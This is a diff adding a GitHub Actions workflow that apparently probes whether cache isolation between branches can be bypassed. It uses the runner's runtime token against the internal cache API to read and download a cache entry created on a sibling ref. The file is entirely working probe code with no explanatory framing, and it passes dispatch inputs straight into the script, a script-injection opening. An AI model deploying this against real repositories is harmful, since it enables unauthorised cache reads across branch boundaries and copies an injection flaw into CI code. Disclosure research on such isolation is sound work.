@@ -1,0 +1,59 @@
+name: probe_v82_cache_consumer
+on:
+  workflow_dispatch:
+    inputs:
+      prod_key:
+        description: producer cache key
+        required: true
+      prod_version:
+        description: producer cache version
+        required: true
+jobs:
+  consume:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: cross-ref-cache-read
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const M = (s) => core.info('MARK ' + s);
+            const crypto = require('crypto');
+            const rt = process.env.ACTIONS_RUNTIME_TOKEN || '';
+            const ru = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
+            M('RT_PRESENT=' + (rt ? 'yes' : 'NO'));
+            M('REF=' + process.env.GITHUB_REF);
+            if (!rt || !ru) { M('CONSUMER_ABORT no token/url'); return; }
+            const SVC = 'github.actions.results.api.v1.CacheService';
+            const tw = async (meth, body) => {
+              const r = await fetch(ru + '/twirp/' + SVC + '/' + meth,
+                { method:'POST', headers:{'Authorization':'Bearer '+rt,'Content-Type':'application/json'}, body: JSON.stringify(body) });
+              return [r.status, await r.text()];
+            };
+            const Pkey = String('${{ github.event.inputs.prod_key }}').trim();
+            const Pver = String('${{ github.event.inputs.prod_version }}').trim();
+            M('PROD_KEY=' + Pkey + ' PROD_VER=' + Pver.slice(0,16) + '...');
+            // POSITIVE CONTROL: create + finalize + read OUR OWN cache entry on THIS ref (proves harness)
+            const ckey = 'v82ctrl-' + process.env.GITHUB_RUN_ID;
+            const cver = crypto.createHash('sha256').update(ckey + '|ctrl').digest('hex');
+            let [c0, b0] = await tw('CreateCacheEntry', {key:ckey, version:cver});
+            let up = null; try { const j = JSON.parse(b0); up = j.signed_upload_url || j.signedUploadUrl || j.uploadUrl; } catch(e){}
+            if (up) {
+              const blob = Buffer.from('ctrl');
+              try { await fetch(up, {method:'PUT', headers:{'x-ms-blob-type':'BlockBlob','Content-Length':'4'}, body:blob}); } catch(e){}
+              await tw('FinalizeCacheEntry', {key:ckey, version:cver, size_bytes:4});
+            }
+            let [cc, cbody] = await tw('GetCacheEntryDownloadURL', {key:ckey, restore_keys:[], version:cver});
+            const ctrlOk = (cc>=200 && cc<300 && /signed|download|url|true/i.test(cbody));
+            M('CONTROL_OWN_CACHE_READ -> ' + cc + (ctrlOk?' (harness OK)':' (harness QUESTIONABLE)') + ' | ' + cbody.slice(0,180).replace(/\n/g,' '));
+            // TEST: read PRODUCER's cache (created on a SIBLING ref) with our ref's token
+            let [tc, tb] = await tw('GetCacheEntryDownloadURL', {key:Pkey, restore_keys:[], version:Pver});
+            let url = null; try { const j = JSON.parse(tb); url = j.signed_download_url || j.signedDownloadUrl || j.downloadUrl; } catch(e){}
+            const cross = (tc>=200 && tc<300 && !!url);
+            M('TEST_CROSS_REF_CACHE -> ' + tc + (cross?' <<< CROSS-REF CACHE READ (ref isolation broken)':'') + ' | ' + tb.slice(0,200).replace(/\n/g,' '));
+            if (cross && url) {
+              try { const d = await (await fetch(url)).text(); M('CACHE_CANARY_FETCH=' + d.slice(0,160).replace(/\n/g,' ')); }
+              catch(e){ M('CACHE_FETCH_ERR=' + String(e).slice(0,100)); }
+            }
+            M('CONSUMER_DONE');
